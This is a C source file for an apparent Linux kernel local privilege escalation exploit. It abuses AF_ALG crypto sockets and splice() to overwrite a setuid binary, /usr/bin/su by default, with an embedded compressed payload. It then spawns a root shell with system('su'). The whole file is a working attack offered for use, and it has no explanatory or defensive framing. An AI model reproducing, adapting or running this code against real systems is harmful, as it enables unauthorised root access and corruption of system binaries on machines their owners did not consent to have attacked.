#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/syscall.h>
#include <linux/if_alg.h>
#include <zlib.h>
#include <errno.h>

#define SOL_ALG 279

/* NR_splice for x86_64 */
#define NR_SPLICE 275

/* Syscall wrappers */
ssize_t splice_syscall(int fd_in, loff_t *off_in, int fd_out, 
                       loff_t *off_out, size_t len, unsigned int flags) {
    return syscall(NR_SPLICE, fd_in, off_in, fd_out, off_out, len, flags);
}

int af_alg_bind(int sock_fd, const char *sock_type, const char *alg_name) {
    struct sockaddr_alg addr;
    
    memset(&addr, 0, sizeof(addr));
    addr.salg_family = AF_ALG;
    strncpy((char *)addr.salg_type, sock_type, sizeof(addr.salg_type) - 1);
    strncpy((char *)addr.salg_name, alg_name, sizeof(addr.salg_name) - 1);
    
    int ret = bind(sock_fd, (struct sockaddr *)&addr, sizeof(addr));
    if (ret < 0) {
        perror("bind");
        return -1;
    }
    return ret;
}

int af_alg_setsockopt(int sock_fd, int level, int optname, const void *optval, socklen_t optlen) {
    int ret = setsockopt(sock_fd, level, optname, optval, optlen);
    if (ret < 0) {
        perror("setsockopt");
        return -1;
    }
    return ret;
}

int af_alg_accept(int sock_fd) {
    int fd = accept(sock_fd, NULL, NULL);
    if (fd < 0) {
        perror("accept");
        return -1;
    }
    return fd;
}

/* Hex string to bytes */
int hex_to_bytes(const char *hex, unsigned char *out, size_t max_len) {
    size_t len = strlen(hex);
    if (len % 2 != 0) return -1;
    if (len / 2 > max_len) return -1;
    
    for (size_t i = 0; i < len; i += 2) {
        unsigned int byte;
        if (sscanf(&hex[i], "%2x", &byte) != 1) return -1;
        out[i / 2] = (unsigned char)byte;
    }
    return len / 2;
}

void exploit(int f, int offset, const unsigned char *payload, size_t payload_len) {
    /* Create AF_ALG socket */
    int a = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (a < 0) {
        perror("socket");
        return;
    }
    
    /* Bind to authenc template */
    if (af_alg_bind(a, "aead", "authenc(hmac(sha256),cbc(aes))") < 0) {
        close(a);
        return;
    }
    
    /* Set key via setsockopt */
    unsigned char key_buf[80];
    memset(key_buf, 0, sizeof(key_buf));
    key_buf[0] = 0x08;
    key_buf[1] = 0x00;
    key_buf[2] = 0x01;
    key_buf[3] = 0x00;
    key_buf[4] = 0x00;
    key_buf[5] = 0x00;
    key_buf[6] = 0x00;
    key_buf[7] = 0x10;
    
    if (af_alg_setsockopt(a, SOL_ALG, 1, key_buf, sizeof(key_buf)) < 0) {
        close(a);
        return;
    }
    
    /* Set IV length */
    unsigned char iv_buf[4] = {0, 0, 0, 0};
    if (af_alg_setsockopt(a, SOL_ALG, 5, iv_buf, sizeof(iv_buf)) < 0) {
        close(a);
        return;
    }
    
    /* Accept crypto socket */
    int u = af_alg_accept(a);
    if (u < 0) {
        close(a);
        return;
    }
    
    /* Send payload */
    unsigned char send_buf[payload_len + 4];
    memset(send_buf, 'A', 4);
    memcpy(&send_buf[4], payload, payload_len);
    
    ssize_t sent = send(u, send_buf, sizeof(send_buf), 0);
    if (sent < 0) {
        perror("send");
        close(u);
        close(a);
        return;
    }
    
    /* Create pipe for splice */
    int pipefd[2];
    if (pipe(pipefd) < 0) {
        perror("pipe");
        close(u);
        close(a);
        return;
    }
    
    int r = pipefd[0];
    int w = pipefd[1];
    
    /* Splice from file to pipe */
    loff_t off_src = 0;
    loff_t off_dst = 0;
    ssize_t spliced = splice_syscall(f, &off_src, w, &off_dst, offset + 4, 0);
    if (spliced < 0) {
        perror("splice (file to pipe)");
        close(r);
        close(w);
        close(u);
        close(a);
        return;
    }
    
    /* Splice from pipe to crypto socket */
    off_src = 0;
    off_dst = 0;
    spliced = splice_syscall(r, &off_src, u, &off_dst, offset + 4, 0);
    if (spliced < 0) {
        perror("splice (pipe to socket)");
        close(r);
        close(w);
        close(u);
        close(a);
        return;
    }
    
    /* Recv to trigger the exploit */
    unsigned char recv_buf[64];
    recv(u, recv_buf, offset + 8, 0);
    
    close(r);
    close(w);
    close(u);
    close(a);
}

int main(int argc, char *argv[]) {
    /* Compressed payload (same as Python version) */
    const char *compressed_hex = "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3";
    
    unsigned char compressed[256];
    int compressed_len = hex_to_bytes(compressed_hex, compressed, sizeof(compressed));
    if (compressed_len < 0) {
        fprintf(stderr, "Failed to decode payload\n");
        return 1;
    }
    
    /* Decompress payload */
    unsigned char payload[4096];
    unsigned long payload_len = sizeof(payload);
    int ret = uncompress(payload, &payload_len, compressed, compressed_len);
    if (ret != Z_OK) {
        fprintf(stderr, "Decompression failed: %d\n", ret);
        return 1;
    }
    
    /* Open target file (default /usr/bin/su) */
    const char *target = (argc > 1) ? argv[1] : "/usr/bin/su";
    int f = open(target, O_RDONLY);
    if (f < 0) {
        perror("open");
        return 1;
    }
    
    fprintf(stderr, "[*] Target: %s\n", target);
    fprintf(stderr, "[*] Payload size: %lu bytes\n", payload_len);
    
    /* Run exploit on each 4-byte chunk */
    for (unsigned int i = 0; i < payload_len; i += 4) {
        fprintf(stderr, "[*] Exploiting offset %u/%lu\n", i, payload_len);
        exploit(f, i, &payload[i], (i + 4 <= payload_len) ? 4 : (payload_len - i));
    }
    
    close(f);
    
    fprintf(stderr, "[+] Exploit complete. Spawning shell...\n");
    system("su");
    
    return 0;
}
